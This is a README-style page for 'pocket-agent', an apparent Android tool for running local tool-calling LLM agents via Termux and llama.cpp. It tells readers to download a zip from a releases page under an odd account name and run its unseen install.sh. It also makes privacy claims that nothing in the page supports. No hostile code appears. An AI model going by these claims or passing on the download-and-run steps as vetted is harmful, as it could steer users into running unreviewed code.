---
layout: "default"
title: "🤖 pocket-agent - Run intelligent AI agents on tablets"
description: "Run tool-calling LLM agents locally on Android devices using Termux and llama.cpp with no cloud dependencies or API keys."
---
# 🤖 pocket-agent - Run intelligent AI agents on tablets

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Blondieredistributed612/pocket-agent/releases)

pocket-agent lets you run a personal AI agent directly on your Android tablet. It uses local processing power to handle requests without sending your data to the cloud. You download a small application package, set it up within your terminal environment, and interact with your device through AI commands. 

This tool uses llama.cpp to manage smart models efficiently. It performs tool-calling tasks, meaning the agent can interact with other applications or data sources on your device.

## 🛠️ System Requirements

Before you begin, ensure your hardware meets the following needs:

* Android tablet running version 10 or higher.
* At least 4GB of RAM.
* 2GB of free storage space for models and core files.
* A stable network connection for the initial setup.

Note that tablet hardware has limits. Large models reduce performance. This software works best with smaller, optimized models designed for local devices.

## 📥 Getting the Software

You must obtain the correct installation package from our release page. Visit the link below to see the available versions.

[Download Setup Files](https://github.com/Blondieredistributed612/pocket-agent/releases)

1. Navigate to the release page using the link above.
2. Look for the latest version number.
3. Download the file ending in `.zip` or the package labeled for Android.
4. Save the file to your tablet internal storage.

## ⚙️ Installation Steps

Follow these steps to prepare your device.

### Step 1: Install Termux
Termux provides the environment required to run this software.
1. Open the F-Droid store or the official Termux website.
2. Install the Termux application.
3. Open Termux on your device.
4. Update the package list by typing `pkg update && pkg upgrade` and pressing Enter.

### Step 2: Extract the Files
1. Move the downloaded `pocket-agent` file to your home folder in Termux.
2. Use the command `unzip pocket-agent.zip` in your terminal to unpack the contents.
3. Verify the files exist by typing `ls`. You should see the agent script and supporting folders.

### Step 3: Run the Agent
1. Navigate to the folder using `cd pocket-agent`.
2. Launch the setup script by typing `./install.sh`. 
3. Follow the text prompts on your screen. The script installs the necessary engines for the AI.
4. Once finished, start the application by typing `./run.sh`.

## 🧠 Using the Agent

After the software starts, you see a prompt. Type your request in plain English. The agent processes your request locally. 

### Understanding Tool-Calling
Tool-calling allows the AI to perform specific actions on your behalf. If you ask the agent to organize files or check system status, the agent identifies the correct tool and executes the task. Because this happens on your device, the agent works offline once fully set up.

### Performance Notes
The speed of the agent depends on your tablet processor. You might notice longer wait times with complex prompts. Use smaller models for faster responses. If your tablet gets warm, close other background applications to free up system resources. 

## 🛡️ Privacy and Safety

All AI processing happens locally on your device. The software does not send your input to external servers. This keeps your personal information private. Because the model resides on your internal storage, you remain in control of all data used by the agent. 

## 🔧 Troubleshooting

If the software fails to start:

* **Memory Errors:** If you see "Out of Memory" errors, your model might be too large. Try a smaller version of the model.
* **Permission Issues:** Run the command `chmod +x run.sh` to make sure the application has permission to start.
* **Storage Check:** Ensure you have enough space. Large language models take up significant room. Delete unnecessary files if the installation aborts.
* **Update Termux:** Ensure your version of Termux is current. Run `pkg upgrade` periodically.

## 📈 Improving Performance

You can optimize the agent by adjusting the thread count. When you run the agent, look for the configuration file labeled `config.yaml`. Open this file in a text editor like nano. Find the line that says `threads` and adjust the number to match your tablet's CPU cores. Usually, half of your total cores provide the best balance between speed and heat management.

## 📋 Common Settings

* **Model File:** The file that stores the AI intelligence. 
* **Command Loop:** The cycle that waits for your next input.
* **Context Limit:** The amount of text the AI remembers from your current session. 

Keep the context limit low if you notice the device slowing down. A smaller limit forces the agent to focus only on recent information.

Keywords: agent, android, edge-ai, llama-cpp, llm, local-llm, on-device-ai, qwen, termux, tool-calling